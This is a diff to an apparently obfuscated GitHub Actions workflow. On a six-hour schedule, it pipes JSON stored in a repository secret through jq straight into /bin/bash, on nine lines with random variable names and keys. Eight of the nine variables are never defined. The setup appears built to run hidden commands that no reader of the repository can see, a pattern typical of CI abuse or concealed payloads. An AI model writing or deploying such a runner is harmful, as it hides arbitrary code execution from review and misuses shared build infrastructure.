@@ -2,23 +2,23 @@ name: beenlemur
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
-
-jobs:  # 30075
+    - cron: '29 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: beenlemur
         env:
-          g50778: ${{ secrets.g50778 }}
+          zw77853: ${{ secrets.zw77853 }}
         run: |
-          echo $g50778 | jq -r .o84672 | /bin/bash
-          echo $vbml19 | jq -r .h3875 | /bin/bash
-          echo $aqxf647 | jq -r .nmjqv780 | /bin/bash
-          echo $udkf58201 | jq -r .t53623 | /bin/bash
-          echo $ods50 | jq -r .cuv62439 | /bin/bash
-          echo $djevd742 | jq -r .c5485 | /bin/bash
-          echo $ksrfr3308 | jq -r .geyn5 | /bin/bash
+          echo $zw77853 | jq -r .epxpt1 | /bin/bash
+          echo $om26 | jq -r .il20 | /bin/bash
+          echo $q8 | jq -r .ruw970 | /bin/bash
+          echo $ch9010 | jq -r .o133 | /bin/bash
+          echo $dh206 | jq -r .szwp9018 | /bin/bash
+          echo $woe415 | jq -r .fdgb819 | /bin/bash
+          echo $jfp4 | jq -r .yls9 | /bin/bash
+          echo $gkv02 | jq -r .sxhb22130 | /bin/bash
+          echo $lzt41 | jq -r .tj20 | /bin/bash
 
